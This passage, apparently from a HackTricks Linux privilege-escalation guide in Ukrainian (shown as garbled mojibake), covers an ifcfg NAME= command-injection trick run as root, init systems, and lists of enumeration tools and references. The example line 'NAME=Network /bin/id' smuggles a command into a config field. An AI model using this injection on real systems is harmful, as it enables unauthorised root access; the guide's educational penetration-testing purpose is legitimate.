–£ –º–æ—î–º—É –≤–∏–ø–∞–¥–∫—É –∞—Ç—Ä–∏–±—É—Ç `NAME=` –≤ —Ü–∏—Ö –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –Ω–µ –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ. –Ø–∫—â–æ —É –≤–∞—Å —î **–±—ñ–ª–∏–π/–ø–æ—Ä–æ–∂–Ω—ñ–π –ø—Ä–æ–±—ñ–ª —É –Ω–∞–∑–≤—ñ, —Å–∏—Å—Ç–µ–º–∞ –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–∞—Å—Ç–∏–Ω—É –ø—ñ—Å–ª—è –±—ñ–ª–æ–≥–æ/–ø–æ—Ä–æ–∂–Ω—å–æ–≥–æ –ø—Ä–æ–±—ñ–ª—É**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–≤—Å–µ –ø—ñ—Å–ª—è –ø–µ—Ä—à–æ–≥–æ –ø–æ—Ä–æ–∂–Ω—å–æ–≥–æ –ø—Ä–æ–±—ñ–ª—É –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —è–∫ root**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd —Ç–∞ rc.d**

–î–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è `/etc/init.d` —î –¥–æ–º–∞—à–Ω—å–æ—é –¥–ª—è **—Å–∫—Ä–∏–ø—Ç—ñ–≤** –¥–ª—è System V init (SysVinit), **–∫–ª–∞—Å–∏—á–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Å–ª—É–∂–±–∞–º–∏ Linux**. –í–æ–Ω–∞ –º—ñ—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç–∏ –¥–ª—è `start`, `stop`, `restart` —Ç–∞ —ñ–Ω–æ–¥—ñ `reload` —Å–ª—É–∂–±. –á—Ö –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∞–±–æ —á–µ—Ä–µ–∑ —Å–∏–º–≤–æ–ª—ñ—á–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è, —â–æ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ `/etc/rc?.d/`. –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π —à–ª—è—Ö —É —Å–∏—Å—Ç–µ–º–∞—Ö Redhat - `/etc/rc.d/init.d`.

–ó —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, `/etc/init` –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ **Upstart**, –Ω–æ–≤—ñ—à–æ—é **—Å–∏—Å—Ç–µ–º–æ—é —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Å–ª—É–∂–±–∞–º–∏**, —è–∫—É –≤–≤—ñ–≤ Ubuntu, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –¥–ª—è –∑–∞–≤–¥–∞–Ω—å —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Å–ª—É–∂–±–∞–º–∏. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –ø–µ—Ä–µ—Ö—ñ–¥ –¥–æ Upstart, —Å–∫—Ä–∏–ø—Ç–∏ SysVinit –≤—Å–µ —â–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –ø–æ—Ä—è–¥ –∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º–∏ Upstart —á–µ—Ä–µ–∑ —à–∞—Ä —Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ –≤ Upstart.

**systemd** –≤–∏—Ö–æ–¥–∏—Ç—å —è–∫ —Å—É—á–∞—Å–Ω–∏–π —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ç–æ—Ä —Ç–∞ –º–µ–Ω–µ–¥–∂–µ—Ä —Å–ª—É–∂–±, —è–∫–∏–π –ø—Ä–æ–ø–æ–Ω—É—î —Ä–æ–∑—à–∏—Ä–µ–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –∑–∞–ø—É—Å–∫ –¥–µ–º–æ–Ω—ñ–≤ –∑–∞ –≤–∏–º–æ–≥–æ—é, —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∞–≤—Ç–æ–º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è–º —Ç–∞ –∑–Ω—ñ–º–∫–∞–º–∏ —Å—Ç–∞–Ω—É —Å–∏—Å—Ç–µ–º–∏. –í—ñ–Ω –æ—Ä–≥–∞–Ω—ñ–∑–æ–≤—É—î —Ñ–∞–π–ª–∏ –≤ `/usr/lib/systemd/` –¥–ª—è –ø–∞–∫—É–Ω–∫—ñ–≤ —Ä–æ–∑–ø–æ–¥—ñ–ª—É —Ç–∞ `/etc/systemd/system/` –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —Å–ø—Ä–æ—â—É—é—á–∏ –ø—Ä–æ—Ü–µ—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä—É–≤–∞–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏.

## –Ü–Ω—à—ñ —Ç—Ä—é–∫–∏

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### –í–∏–±—ñ—Ä–∫–∞ –∑ –æ–±–º–µ–∂–µ–Ω–∏—Ö –æ–±–æ–ª–æ–Ω–æ–∫

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## –ó–∞—Ö–∏—Å—Ç —è–¥—Ä–∞

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## –î–æ–¥–∞—Ç–∫–æ–≤–∞ –¥–æ–ø–æ–º–æ–≥–∞

[–°—Ç–∞—Ç–∏—á–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ Impacket](https://github.com/ropnop/impacket\_static\_binaries)

## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ Linux/Unix

### **–ö—Ä–∞—â–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–æ—à—É–∫—É –≤–µ–∫—Ç–æ—Ä—ñ–≤ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º—É —Ä—ñ–≤–Ω—ñ Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** –ü–µ—Ä–µ–ª—ñ—á–µ–Ω–Ω—è —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —è–¥—Ä–∞ –≤ Linux —Ç–∞ MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (—Ñ—ñ–∑–∏—á–Ω–∏–π –¥–æ—Å—Ç—É–ø):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**–ö–æ–º–ø—ñ–ª—è—Ü—ñ—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö —Å–∫—Ä–∏–ø—Ç—ñ–≤**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
